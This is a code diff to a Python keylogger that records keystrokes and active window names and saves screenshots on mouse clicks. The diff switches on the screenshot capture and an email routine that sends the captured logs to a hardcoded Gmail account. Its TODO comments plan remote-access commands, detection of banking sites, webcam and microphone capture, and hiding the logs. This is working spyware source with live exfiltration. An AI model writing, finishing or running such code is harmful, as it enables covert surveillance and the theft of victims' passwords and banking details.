@@ -2,7 +2,7 @@
 from pynput.keyboard import Listener as k_Listener
 from pynput.mouse import Listener as m_Listener
 from pyscreenshot import grab
-import win32gui
+import win32gui  # To get active window name
 
 # Standard Modules
 import os
@@ -11,11 +11,30 @@ import requests
 import socket
 import random
 import threading
-import smtplib
+import smtplib  # To send an email
 
 # User Defined Modules
 import LogModel
 import UserModel
+
+# TODO RAT - Give commands based on keyword
+# TODO RAT - Request Log On Demand
+# TODO RAT - Request ScreenShot On Demand
+
+# TODO If User on apps such as, chrome take a screenshot
+# TODO Detect if user visited a banking site
+
+# TODO Improve key logging logic
+# TODO Encrypt txt file
+
+# TODO Improve screenshot logic
+# TODO compress screenshots then upload them
+
+# TODO Improve email logic
+# TODO Send txt file as an email, then delete it
+
+# TODO Microphone Access
+# TODO Webcam Access
 
 datetime = time.ctime(time.time())
 
@@ -36,10 +55,6 @@ Log = LogModel.LogModel(logOwner=msg_Schema, logText=[], logHeader=[])
 old_app = ''
 old_file = ''
 
-
-# TODO IF User on apps such as, chrome take a screenshot
-# TODO Detect if user visited a banking site
-# TODO RAT - Give commands based on keyword
 
 def log_data(key):
     global old_app
@@ -67,11 +82,6 @@ def log_data(key):
         Log.logText.append(key)
 
 
-# TODO Encrypt txt file
-# TODO Improve key logging logic
-# TODO Delete file after being sent
-# TODO RAT - Request Log On Demand
-
 def write_file():
     global old_file
 
@@ -92,34 +102,23 @@ def write_file():
     print('written all good')
 
 
-# TODO improve screenshot logic
-# TODO RAT - Request ScreenShot On Demand
-
-
 def save_screenshot(x, y, button, pressed):
-    print("Shot!")
 
-    # if pressed:
-    #     im = grab()
-    #     im.save(os.path.expanduser('~') + '/Downloads/' + str(random.randint(11111, 99999)) + '.jpeg')
-
-
-# TODO Send txt file as an email, then delete it
-# TODO compress screenshots then upload them
+    if pressed:
+        im = grab()
+        im.save(os.path.expanduser('~') + '/Downloads/' + str(random.randint(11111, 99999)) + '.jpeg')
 
 
 def send_email():
-    # TODO Improve email logic
-
     sender_email = "firstdjin@gmail.com"
     receiver_email = "firstdjin@gmail.com"
     password = "djin1234"
     message = Log.toString().encode()
 
-    # server = smtplib.SMTP('smtp.gmail.com', 587)
-    # server.starttls()
-    # server.login(sender_email, password)
-    # server.sendmail(sender_email, receiver_email, message)
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server.starttls()
+    server.login(sender_email, password)
+    server.sendmail(sender_email, receiver_email, message)
 
 
 def send_logs():
@@ -128,7 +127,7 @@ def send_logs():
 
     while True:
 
-        time.sleep(6)
+        time.sleep(60)
 
         if len(Log.logText) > 1 and \
                 (''.join(Log.logText) != previous_log_text or ''.join(Log.logHeader) != previous_log_header):
@@ -154,6 +153,6 @@ def screen_logger():
 
 
 if __name__ == '__main__':
-    threading.Thread(target=send_logs).start()
     threading.Thread(target=key_logger).start()
     threading.Thread(target=screen_logger).start()
+    threading.Thread(target=send_logs).start()
